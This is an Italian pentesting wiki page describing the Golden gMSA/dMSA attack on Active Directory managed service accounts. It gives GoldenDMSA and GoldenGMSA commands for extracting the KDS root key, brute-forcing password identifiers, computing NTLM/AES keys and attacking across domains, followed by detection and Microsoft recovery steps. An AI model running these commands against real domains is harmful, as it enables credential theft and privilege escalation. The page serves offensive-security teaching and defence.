# Golden gMSA/dMSA Attack (Derivazione offline delle password degli account di servizio gestiti)

{{#include ../../banners/hacktricks-training.md}}

## Panoramica

Gli account Windows Managed Service sono principal di dominio destinati all'esecuzione di servizi senza che un amministratore debba gestire una password di lunga durata:

1. **gMSA** (group Managed Service Account) può essere utilizzato dai computer autorizzati tramite `msDS-GroupMSAMembership` / `PrincipalsAllowedToRetrieveManagedPassword`.
2. **dMSA** (delegated Managed Service Account) è stato introdotto in **Windows Server 2025**. Associa l'autenticazione normale alle identità delle macchine autorizzate e può sostituire un account di servizio legacy tramite un flusso di migrazione.

Non confondere **Golden dMSA** con **BadSuccessor**. Golden dMSA richiede la compromissione del materiale della root key KDS e deriva le chiavi degli account gestiti; [BadSuccessor](badsuccessor-dmsa-migration-abuse.md), invece, sfrutta il controllo di un oggetto dMSA e dei relativi attributi di migrazione.

Un DC non memorizza una password in chiaro generata indipendentemente per ogni gMSA. Deriva la password dell'account da una **KDS root key**, da una chiave Group Key Distribution Protocol (GKDI) indicizzata temporalmente e dal SID dell'account. Gli oggetti root-key sono oggetti `msKds-ProvRootKey` sotto `CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration,...`; il valore sensibile è `msKds-RootKeyData`. `msDS-ManagedPasswordId` **non è un GUID**: è un identificatore di chiave binario che contiene il GUID della root-key KDS, gli indici `L0`/`L1`/`L2` GKDI e i metadati del dominio/forest. Il DC applica la KDF con l'etichetta `GMSA PASSWORD` e il SID binario come contesto, quindi espone un `MSDS-MANAGEDPASSWORD_BLOB` solo ai principal autorizzati a recuperare la password di un gMSA.<sup>[[2]](#references)</sup>

Un dMSA normalmente differisce dal punto di vista operativo: il suo secret dovrebbe rimanere sul DC e il KDC rilascia credenziali a una macchina autorizzata. Tuttavia, i dMSA riutilizzano la derivazione della password KDS/GKDI sottostante. Golden dMSA ricostruisce direttamente quel secret e aggira quindi il flusso previsto, vincolato alla macchina, e Credential Guard sull'host del servizio.<sup>[[1]](#references)</sup>

## Golden gMSA / Golden dMSA Attack

Dopo aver estratto una KDS root key, un attacker può derivare le password degli account associati a tale chiave senza leggere `msDS-ManagedPassword`. Questo aggira l'ACL di recupero della password per-account e resiste alle normali rotazioni delle password gestite finché la root key compromessa rimane in uso. Per i gMSA, `msDS-ManagedPasswordId`, normalmente leggibile, fornisce l'identificatore esatto della chiave. Per i dMSA con ACL restrittive, Golden dMSA riduce l'identificatore mancante a soli **1.024 candidati**.<sup>[[1]](#references)[[2]](#references)</sup>

### Prerequisiti

* L'oggetto KDS root-key pertinente, solitamente ottenuto con diritti Enterprise Admin / Domain Admin del forest-root, con `SYSTEM` su un DC oppure da un database o backup di un DC esposto.<sup>[[1]](#references)[[2]](#references)</sup>
* Il SID dell'account target, il dominio DNS, il nome del forest e `sAMAccountName`.<sup>[[1]](#references)[[2]](#references)</sup>
* Per il calcolo diretto di un gMSA, il valore `msDS-ManagedPasswordId` codificato in base64; per Golden dMSA è invece possibile fare un tentativo per ciascun candidato.<sup>[[1]](#references)[[2]](#references)</sup>
* Un host Windows x64 con .NET Framework 4.7.2 per [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA).<sup>[[3]](#references)</sup>

### Fase 1 - Estrarre la KDS root key

`GoldenDMSA` e [`GoldenGMSA`](https://github.com/Semperis/GoldenGMSA) esportano i campi dell'oggetto root-key come blob base64. Senza un argomento relativo al dominio, gli strumenti interrogano il forest-root e richiedono un accesso privilegiato appropriato alla directory. Con l'argomento relativo al dominio/forest, `SYSTEM` su un DC può interrogare la replica locale del naming context Configuration di quel DC.<sup>[[1]](#references)[[2]](#references)</sup>
```cmd
:: GoldenDMSA: Enterprise Admin, or SYSTEM on a DC with --domain
GoldendMSA.exe kds
GoldendMSA.exe kds -g KDS_ROOT_KEY_GUID
GoldendMSA.exe kds --domain child.example.local

:: GoldenGMSA equivalents
GoldenGMSA.exe kdsinfo
GoldenGMSA.exe kdsinfo --guid KDS_ROOT_KEY_GUID
```
Registra sia il GUID della root key sia il blob della root key in base64. L'esportazione degli hive di registro `SECURITY`/`SYSTEM` non costituisce di per sé la root key KDS: il materiale autorevole si trova nella partizione Configuration di AD.<sup>[[1]](#references)[[2]](#references)</sup>

### Fase 2 - Enumerazione degli oggetti gMSA / dMSA

Per i gMSA, recupera `sAMAccountName`, `objectSid` e il valore binario `msDS-ManagedPasswordId`. Quest'ultimo è normalmente leggibile anche quando al chiamante non è consentito recuperare `msDS-ManagedPassword`.<sup>[[2]](#references)</sup>
```powershell
Get-ADServiceAccount -Filter * -Properties objectSid,msDS-ManagedPasswordId |
Select-Object sAMAccountName,objectSid,msDS-ManagedPasswordId

GoldenGMSA.exe gmsainfo --domain example.local
```
L'ACL predefinita di un dMSA può impedire l'enumeration LDAP con privilegi ridotti. `GoldenDMSA info` può eseguire query LDAP oppure enumerare i RID candidati e risolvere i SID tramite `LsaLookupSids` su `\PIPE\lsarpc`, quindi distinguere i dMSA dagli account computer e dai gMSA.<sup>[[1]](#references)[[3]](#references)</sup>
```cmd
GoldendMSA.exe info -d example.local -m ldap
GoldendMSA.exe info -d example.local -m brute -u alice -p PASSWORD -o EXAMPLE -r 5000
```
### Fase 3 - Ricostruire o indovinare `msDS-ManagedPasswordId`

L'identificatore della chiave include `L0Index`, `L1Index` e `L2Index`, non un timestamp di creazione dell'account seguito da bit casuali. Semperis ha scoperto che il percorso di generazione della password non utilizza il candidato `L0Index`, mentre `L1Index` e `L2Index` sono entrambi limitati ai valori `0..31`. Di conseguenza, un attacker che conosce il GUID della root key, il dominio, la foresta e il SID può costruire tutti i `32 * 32 = 1,024` identificatori candidati.<sup>[[1]](#references)</sup>
```cmd
:: Write 1,024 base64 ManagedPasswordId candidates to KDS_ROOT_KEY_GUID.txt
GoldendMSA.exe wordlist -s DMSA_SID -d example.local -f example.local -k KDS_ROOT_KEY_GUID

:: Derive and validate candidates; -t caches the successful TGT
GoldendMSA.exe bruteforce -s DMSA_SID -i KDS_ROOT_KEY_GUID -k KDS_ROOT_KEY_BASE64 -d example.local -u svc_dmsa$ -t
```
Le derivazioni sono offline, ma l'identificazione del candidato attivo richiede generalmente tentativi di autenticazione. Questo può produrre una raffica di errori di pre-autenticazione Kerberos o di convalida NTLM prima di trovare la chiave valida. Per le chiavi Kerberos AES, il salt dell'account gestito utilizzato dallo strumento è `UPPERCASE.DNS.DOMAIN` + `host` + l'UPN dell'account in minuscolo, senza il `$` finale (ad esempio, `EXAMPLE.LOCALhostsvc_dmsa.example.local`).<sup>[[1]](#references)</sup>

### Fase 4 - Calcolare e usare la password

Se l'identificatore esatto è noto, calcolare il buffer della password di 256 byte e convertirlo in materiale NTLM/AES. Il valore base64 stampato da questi strumenti è il buffer della password codificato, **non** il `MSDS-MANAGEDPASSWORD_BLOB` LDAP stesso.<sup>[[2]](#references)[[3]](#references)</sup>
```cmd
GoldendMSA.exe compute -s ACCOUNT_SID -k KDS_ROOT_KEY_BASE64 -d example.local -m MANAGED_PASSWORD_ID_BASE64
GoldendMSA.exe convert -d example.local -u svc_account$ -p BASE64_PASSWORD

GoldenGMSA.exe compute --sid ACCOUNT_SID --kdskey KDS_ROOT_KEY_BASE64 --pwdid MANAGED_PASSWORD_ID_BASE64
```
Il risultato NTLM può essere utilizzato dove NTLM è accettato; la chiave AES può essere utilizzata per overpass-the-hash / richieste TGT dove l'account gestito è configurato solo per AES. Ciò fornisce i privilegi, gli SPN, la configurazione della delega e l'accesso alle risorse dell'account del servizio gestito compromesso senza aggiungere il computer dell'attaccante a `PrincipalsAllowedToRetrieveManagedPassword`.<sup>[[1]](#references)[[2]](#references)</sup>

### Abuso della partizione Configuration tra domini

Gli oggetti delle chiavi radice KDS risiedono nel contesto di denominazione Configuration della foresta, che viene replicato nei DC dei domini child. Di conseguenza, `SYSTEM` su un DC del dominio child può leggere il materiale KDS della radice della foresta dalla replica locale del DC child, anche se i Domain Admins del dominio child non possono leggere direttamente l'oggetto da un DC della radice della foresta. Se l'attaccante può anche leggere `msDS-ManagedPasswordId` di un gMSA del dominio parent, GoldenGMSA può calcolare la password di quell'account parent; il SID filtering non impedisce questo attacco crittografico.<sup>[[5]](#references)</sup>
```cmd
:: Run as SYSTEM on a child.example.local DC
GoldenGMSA.exe kdsinfo --forest child.example.local

:: Query target metadata in the parent, then combine both inputs
GoldenGMSA.exe gmsainfo --domain example.local
GoldenGMSA.exe compute --sid PARENT_GMSA_SID --domain example.local --forest child.example.local
```
## Rilevamento, contenimento e ripristino

* Configurare una SACL sul container **Master Root Keys**, ereditata dagli oggetti `msKds-ProvRootKey`, per le letture riuscite di `msKds-RootKeyData`. Con l'auditing Directory Service Access abilitato, un'estrazione online produce l'evento Security **4662**; analizzare i soggetti che non sono DC previsti o operatori Tier-0. Eseguire inoltre l'auditing delle modifiche a queste SACL e agli ACL degli oggetti root-key.<sup>[[1]](#references)[[2]](#references)[[4]](#references)</sup>
* Un attacco child-to-parent legge l'oggetto KDS dalla replica locale del child DC compromesso, quindi il dominio forest-root potrebbe non osservare tale lettura. Nel dominio parent, eseguire l'auditing delle letture riuscite di `msDS-ManagedPasswordId` (schema GUID `0e78295a-c6d3-0a40-b491-d62251ffa0a6`) sugli oggetti `msDS-GroupManagedServiceAccount` e analizzare le letture effettuate da principal di un altro dominio.<sup>[[5]](#references)</sup>
* Correlare l'accesso agli oggetti KDS con logon insoliti da parte di account gestiti e picchi di errori Kerberos/NTLM per gli account di servizio con suffisso `$`. Il calcolo offline dopo il furto precedente di database/backup non è visibile a un DC live.<sup>[[1]](#references)[[3]](#references)</sup>
* La normale rotazione delle password non è sufficiente dopo l'esposizione della root-key. La procedura di recovery attuale di Microsoft crea una nuova KDS root key, riavvia KDS su tutti i DC rilevanti e sposta gli account interessati su quella chiave. Se l'ambito o il momento dell'esposizione sono sconosciuti e non è accettabile attendere un roll sicuro, sostituire ogni gMSA che ha utilizzato la chiave compromessa; se l'ambito è noto, Microsoft documenta un workflow di authoritative-restore per forzare un rolling sicuro. Convalidare il nuovo GUID della chiave in `msDS-ManagedPasswordId` prima di eliminare la vecchia chiave.<sup>[[4]](#references)</sup>
* Trattare l'accesso al database dei DC e ai backup, la replica della partizione Configuration e l'amministrazione delle KDS root-key come Tier-0. La riduzione di `ManagedPasswordIntervalInDays` limita alcune finestre di recovery, ma non revoca una root key già compromessa.<sup>[[4]](#references)</sup>

## Tooling

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) - enumerazione dMSA/gMSA, generazione degli identificatori, validazione di 1.024 candidati, calcolo delle password e conversione NTLM/AES.<sup>[[3]](#references)</sup>
* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) - enumerazione gMSA/KDS e calcolo delle password online, offline e cross-domain.<sup>[[2]](#references)</sup>
* [`Rubeus`](https://github.com/GhostPack/Rubeus) e [`Impacket`](https://github.com/fortra/impacket) - utilizzare o convalidare le chiavi NTLM/AES derivate nei test autorizzati.



## References

- [1] [Golden dMSA - bypass dell'autenticazione per gli account Managed Service delegati](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [2] [Attacchi gMSA in Active Directory](https://www.semperis.com/blog/golden-gmsa-attack/)
- [3] [Repository GitHub Semperis/GoldenDMSA](https://github.com/Semperis/GoldenDMSA)
- [4] [Microsoft - Come eseguire il recovery dopo un attacco Golden gMSA](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/recover-from-golden-gmsa-attack)
- [5] [Filtro SID come confine di sicurezza tra domini? Parte 5 - Attacco trust Golden gMSA](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
{{#include ../../banners/hacktricks-training.md}}
